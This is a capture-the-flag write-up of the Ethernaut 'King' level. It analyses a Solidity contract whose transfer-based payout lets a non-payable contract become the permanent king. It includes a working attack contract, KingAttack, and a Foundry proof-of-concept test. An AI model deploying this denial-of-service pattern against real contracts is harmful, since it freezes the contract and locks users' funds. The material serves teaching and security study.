# Level 9 - King

## Objectives

- Break the game! You will beat the level if you can avoid such a self proclamation.

## Contract Overview

The `King` contract is a simple Ponzi game. Players send ether to the contract (a prize). Whoever sends an amount of ether that is larger than the current prize becomes the new king. The old king gets the new prize. He earns the difference between the new prize and the old prize (the prize that he set).

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/King_slither.png)

## Finding the weak spots

The weak spot is the `receive` function that is a special function that allow the contract to receive directly Ethers from external contract or EOA. It looks like:

```solidity
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```

The first thing that we see is `require(msg.value >= prize || msg.sender == owner)`. This check allows the owner of the contract to always take the kingship of the contract, resetting all the values.

From a security standpoint, this is a huge concern in general because this function allows the owner to reset everything without repaying the current king and leaving funds stuck in the contract. But this is not the main problem that will let us exploit the contract and solve the challenge.

The problem is inside the `king.transfer(msg.value)` instruction. The transfer function allow a contract to transfer X amount of ETH from an sender to a receiver. Let's remind that we can send Ether to other contracts by:

- transfer
- send
- call

  | Function   | Amount of Gas Forwarded        | Exception Propagation              |
  | :--------- | :----------------------------- | :--------------------------------- |
  | `send`     | 2300 (not adjustable)          | `false` on failure (returns bool)  |
  | `transfer` | 2300 (not adjustable)          | `throws` on failure (throws error) |
  | `call`     | all remaining gas (adjustable) | `false` on failure (returns bool)  |

  _Reference: https://solidity-by-example.org/sending-ether/_

In `King` contract we have `transfer` method so that the transaction reverts and when `transfer` reverts also `receive` reverts. Reverting will make the `King` contract unusable, because no one will be able to become the new King!

Therefore, to finish this level, we just need to deploy a malicious contract, that will send Ether to `King` contract and that will not accept any kind of Ether transfer toward it.

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract that will send Ether (current prize) to the victim contract to become the new king. Victim contract will try to reclaim the kingship by sending an equivalent amount of prize money to the attacker contract via `transfer` function but it won't be possible because attacker contract won't implement any method `fallback()` or `receive()` to handle Ether transfer. In result the transfer call from victim contract will simply revert, reverting the whole transaction and the level won't be able to become the new king.

## Plan of the attack

1. Attacker creates the malicious contract that will send Ether (current prize) to the victim contract.
2. Attacker becomes the new king.
3. Victim contract will try to reclaim the kingship by sending an equivalent amount of prize money to the attacker contract via `transfer` function.
4. Attacker contract won't implement any method `fallback()` or `receive()` to handle Ether transfer. That is why attacker contract will not be able to receive any Ether, the transfer call from victim contract will simply revert, reverting the whole transaction and the level won't be able to become the new king.

## Malicious contract (KingAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingAttack {
    constructor(address payable to) public payable {
        (bool success, ) = to.call{value: msg.value}("");
        require(success, "Call failed");
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/09-King.t.sol))

```solidity
        emit log_string(
            "Deploying the attack contract and sending ether to claim kingship...."
        );
        KingAttack kingAttack = new KingAttack{value: kingContract.prize()}(
            payable(levelAddress)
        );

        emit log_named_address("Attacker address: ", address(kingAttack));

        emit log_named_address("New king: ", kingContract._king());

        // Test assertion
        assertEq(kingContract._king(), address(kingAttack));
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/King.png)

## Recommendations

- External calls should be used with caution and proper error handling should be implemented on all external calls.

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-9-solution-king)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
